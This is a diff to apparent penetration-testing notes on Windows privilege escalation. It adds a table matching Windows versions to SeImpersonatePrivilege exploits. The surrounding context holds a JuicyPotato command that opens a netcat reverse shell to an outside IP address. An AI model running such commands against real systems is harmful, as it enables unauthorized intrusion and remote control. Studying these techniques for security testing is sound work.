@@ -397,6 +397,16 @@ Get the netcat exe from: https://github.com/int0x33/nc.exe/
 .\JuicyPotato.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c C:\Users\bruce\Desktop\nc64.exe 10.128.66.134 5555 -e cmd.exe" -t "*" -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
 ```
 
+##  SeImpersonatePrivilege Exploit Cheat Sheet
+
+| Windows Version                              | Recommended Exploit |
+|---------------------------------------------|--------------------|
+| Windows Server 2008 / 2012 / 2012 R2        | JuicyPotato        |
+| Windows 10 (older builds)                   | JuicyPotato / RoguePotato |
+| Windows 10 (newer builds)                   | PrintSpoofer       |
+| Windows Server 2016 / 2019                  | PrintSpoofer       |
+| Windows Server 2022 / fully patched systems | GodPotato          |
+
 ---
 
 # 19. DLL Hijacking
